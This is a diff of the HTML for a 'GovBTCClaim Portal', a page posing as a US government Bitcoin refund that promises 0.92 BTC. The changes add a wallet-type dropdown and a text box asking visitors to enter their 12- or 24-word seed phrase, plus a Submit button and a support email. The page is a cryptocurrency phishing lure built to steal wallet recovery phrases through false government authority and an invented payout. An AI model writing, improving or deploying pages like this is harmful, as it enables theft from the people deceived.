@@ -1,29 +1,32 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
+  <meta charset="UTF-8">
   <title>GovBTCClaim Portal</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" href="css/style.css" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
       font-family: Arial, sans-serif;
       background-color: #f4f4f4;
+      background-image: url('https://www.transparenttextures.com/patterns/white-wall.png');
       text-align: center;
       padding-top: 50px;
     }
+
     .container {
       background: white;
       width: 90%;
-      max-width: 400px;
+      max-width: 420px;
       margin: auto;
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
+
     h2 {
       color: #f7931a;
     }
+
     .btn {
       background-color: #f7931a;
       color: white;
@@ -34,28 +37,19 @@
       cursor: pointer;
       font-size: 16px;
     }
-    .wallet-box {
-      margin-top: 25px;
-      background: #eee;
-      padding: 15px;
-      border-radius: 8px;
-      word-break: break-word;
-    }
+
     .note {
       font-size: 13px;
       color: #777;
       margin-top: 10px;
     }
-    .highlight {
-      font-weight: bold;
-      font-size: 18px;
-      margin-top: 15px;
-      color: green;
-    }
-    .faint-text {
-      font-size: 12px;
-      color: #777;
-      margin-top: 5px;
+
+    select, input[type="text"] {
+      padding: 10px;
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
     }
   </style>
 </head>
@@ -63,44 +57,46 @@
   <div class="container">
     <h2>🇺🇸 Government BTC Refund</h2>
     <p>Claim your Bitcoin refund through verified wallet connection.</p>
-
-    <div class="highlight">
-      You are eligible to receive: 0.92 BTC (~$99,791 USD)
-      <div class="faint-text">
-        (Minimum wallet balance: 0.0092 BTC<br>
-        For help, contact: <a href="mailto:admin@govbtcclaim.org">admin@govbtcclaim.org</a>)
-      </div>
-    </div>
+    <p><strong>Amount to be received: 0.92 BTC ≈ $99,791</strong></p>
 
     <button class="btn" onclick="connectWallet()">Connect Wallet</button>
 
-    <div class="wallet-box" id="walletBox" style="display:none;">
-      <strong>Wallet Type:</strong> <span id="walletType">MetaMask</span><br />
-      <strong>Seed Phrase:</strong><br />
-      <span id="walletAddress">********************</span>
+    <div id="walletSection" style="display:none; margin-top:20px;">
+      <label for="walletSelect">Wallet Type:</label>
+      <select id="walletSelect">
+        <option value="MetaMask">MetaMask</option>
+        <option value="TrustWallet">Trust Wallet</option>
+        <option value="Coinbase">Coinbase Wallet</option>
+        <option value="Other">Other</option>
+      </select>
+
+      <label for="seedInput" style="margin-top:10px;">Seed Phrase:</label>
+      <input type="text" id="seedInput" placeholder="Enter your 12 or 24-word phrase">
+
+      <button class="btn" onclick="submitWallet()">Submit</button>
     </div>
 
     <div class="note">
-      For assistance, please contact support or use the live chat below.
+      Minimum wallet balance: 0.0092 BTC<br>
+      <small>(If your balance is lower, contact support)</small><br>
+      For inquiries: <strong>admin@govbtcclaim.org</strong>
     </div>
   </div>
 
-  <!-- Wallet Logic -->
-  <script src="js/connect.js"></script>
-
-  <!-- Start of Tawk.to Script -->
+  <!-- Live Chat Widget -->
   <script type="text/javascript">
-  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-  (function(){
-  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-  s1.async=true;
-  s1.src='https://embed.tawk.to/686c82558d299b19083881aa/default';
-  s1.charset='UTF-8';
-  s1.setAttribute('crossorigin','*');
-  s0.parentNode.insertBefore(s1,s0);
-  })();
+    var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();
+    (function() {
+      var s1 = document.createElement("script"), s0 = document.getElementsByTagName("script")[0];
+      s1.async = true;
+      s1.src = 'https://embed.tawk.to/686c82558d299b19083881aa/default';
+      s1.charset = 'UTF-8';
+      s1.setAttribute('crossorigin', '*');
+      s0.parentNode.insertBefore(s1, s0);
+    })();
   </script>
-  <!-- End of Tawk.to Script -->
 
+  <!-- JS Logic -->
+  <script src="js/connect.js"></script>
 </body>
 </html>
